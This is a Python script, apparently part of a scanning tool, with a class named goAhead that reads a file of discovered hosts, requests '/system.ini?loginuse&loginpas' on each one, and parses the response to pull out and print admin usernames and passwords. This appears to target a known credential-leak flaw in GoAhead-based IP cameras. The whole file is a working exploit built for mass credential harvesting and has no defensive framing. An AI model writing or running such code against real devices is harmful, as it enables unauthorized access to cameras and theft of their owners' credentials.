from urllib.request import urlopen
import os, sys
import unicodedata
from host import host
class goAhead:
	def goAheadExploit(self):
		path = os.path.abspath(os.path.dirname(sys.argv[0]))
		vulnerable_host = open(path + '/host/up_host.txt', 'r').read().splitlines()
		a = 0
		while a < len(vulnerable_host):
			try:
				res = vulnerable_host[a]
				address = host.Host.addressRegex(res)
				url = "http://" + address['ip'] + ":" + str(address['port']) + "/system.ini?loginuse&loginpas"
				f = urlopen(url)
				lines = f.read().decode(errors='ignore')
				splitted = []
				indexs = []
				for l in range(0, len(lines)):
					if unicodedata.category(lines[l])[0] != "C":
						indexs.append(l)
				word = ""
				for i in range(0, len(indexs)-1):
					if indexs[i] == indexs[i+1]-1:
						word += lines[indexs[i]]
					else:
						word += lines[indexs[i]]
						splitted.append(word)
						word = ""
				q = "Q"
				x = [n for n, item in enumerate(splitted) if item == q]
				credIndex = x[1]
				username = splitted[credIndex + 1]
				password = splitted[credIndex + 2]
				print("[-]Found http://" + address['ip'] + ":" + str(address['port']) + "  with credentials " + username + ":" + password)
			except:
				pass
			a += 1
